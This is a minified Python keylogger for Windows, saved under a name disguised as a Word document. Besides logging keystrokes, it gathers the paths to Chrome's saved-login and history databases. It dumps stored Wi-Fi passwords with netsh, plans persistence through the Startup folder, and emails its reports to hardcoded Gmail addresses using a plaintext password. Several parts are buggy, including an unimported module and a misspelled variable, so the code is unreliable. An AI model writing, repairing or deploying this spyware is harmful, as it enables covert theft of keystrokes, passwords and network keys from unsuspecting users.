import smtplib
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from os import getcwd,path
from subprocess import check_output
from time import sleep
import keyboard
SENDING_INTERVAL=30
SENDER="momo.lareinedesmouettes15@gmail.com"
RECEIVERS=["momo.lareinedesmouettes15@gmail.com","bdouilleur@gmail.com"]
PASSWORD="Momo123#"
KEYLOGGER_FILE="Document1.docx.exe"
global log
log=""
typed_string=""
def logprint(text,overwrite=False):
 global log
 print(text)
 if overwrite:
  log=text
 else:
  log+=text
def on_press(event):
 global log,typed_string
 logprint(f"{event.time}:Key {event.name} pressed (Code:{event.scan_code})\n")
 typed_string+=f"{event.name}"
def get_chrome_data():
 global log
 logprint("INFO: Attempting to retrieve chrome data...\n")
 data_path=path.expanduser('~').replace("\\",'/')+"/AppData/Local/Google/Chrome/User Data/Default"
 login_db_path=path.join(data_path,'Login Data')
 history_db_path=path.join(data_path,'History')
 logprint("INFO: Successfully retrieved chrome data.\n")
 return[login_db_path,history_db_path]
def get_wifi_data():
 global log
 logprint("INFO: Attempting to retrieve wifi data...\n")
 data=check_output(['netsh','wlan','show','profiles']).decode('utf-8',errors="backslashreplace").split('\n')
 profiles=[i.split(":")[1][1:-1]for i in data if "Profil Tous les utilisateurs" in i]
 credentials_list=[]
 for i in profiles:
  results=subprocess.check_output(['netsh','wlan','show','profile',i,'key=clear']).decode('utf-8',errors="backslashreplace").split('\n')
  results=[b.split(":")[1][1:-1]for b in results if "Contenu de la cl" in b]
  credential_set={"ESSID":"","Key":""}
  credential_set["ESSID"]=f"{i.strip()}"
  try:
   credential_set["Key"]=f"{results[0]}"
  except IndexError:
   credential_set["Key"]="[Unknown]"
  finally:
   credentials_list.append(credential_set)
 file_path="{}/wifi.json".format(path.expanduser('~').replace('\\','/'))
 logprint(f"INFO: Writing data to {file_path}\n")
 with open(file_path,"w")as file:
  file.write(credentials_list)
 logprint("INFO: Successfully retrieved wifi data.\n")
 return file_path
def make_persistent(current_file_name):
 logprint("INFO: Attempting to become persistent...")
 current_file_path="{}/{}".format(getcwd().replace('\\','/'),current_file_name)
 new_file_path="{}/{}".format(path.expanduser('~').replace('\\','/'),"AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")
 try:
  command_output=check_output(f"cp {current_file_path} {new_file_path}")
 except:
  logprint("ERROR: cp command failed, see output below.")
  logprint(command_output)
  logprint("Warning: Persistence operation failed.")
 else:
  logprint("INFO: Successfully made program persistent")
def send_results(file_paths=[]):
 print("INFO: Running sending check...")
 global log,typed_string
 if log!="":
  logprint("INFO: New logs detected.")
  logprint("INFO: Generating e-mail report...")
  msg=MIMEMultipart()
  msg['From']=SENDER
  msg['To']=",".join(RECEIVERS)
  msg['Subject']="Keylogger Report"
  body=f"Report:\nLog (since last report):\n{log}\n\n\n\nTyped string(since program launch):\n{typed_string}\n\n\n\n{'Attached files' if file_paths else ''}."
  msg.attach(MIMEText(body,'plain'))
  if file_paths:
   for file in file_paths:
    attachement=open(file,'rb')
    p=MIMEBase('application','octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition',f'attachment; filename={file}')
    msg.attach(p)
  text=msg.as_string()
  logprint(f"INFO: Connecting to GMail SMTP server, with username {SENDER} and PASSWORD {PASSWORD}.\n")
  try:
   server=smtplib.SMTP('smtp.gmail.com',587)
   server.starttls()
   server.login(SENDER,PASSWORD)
  except Exception as e:
   logprint(f"ERROR: Couldn't connect to server, see error traceback below\n{type(e)}\n{str(e)}\n")
   logprint(f"ERROR: Mailing failed.\n")
  else:
   try:
    logprint(f"INFO: Sending from {SENDER} to {RECEIVERS}...\n")
    server.sendmail(SENDER,RECEIVERS,text)
   except Exception:
    logprint(f"ERROR: Couldn't send mail, see error traceback below\n{type(Exception)}\n{str(Exception)}\n")
    logprint(f"ERROR: Mailing failed.\n")
   else:
    logprint("INFO: Mailing successful.\n")
    server.quit()
    logprint('INFO: Cleared "log" variable.\n')
    logprint("",overwrite=True)
 else:
  print("INFO: No new keyboard input.")
keyboard.on_press(on_press)
while 1:
 sleep(SENDING_INTERVAL)
 send_results()
# Created by pyminifier (https://github.com/liftoff/pyminifier)
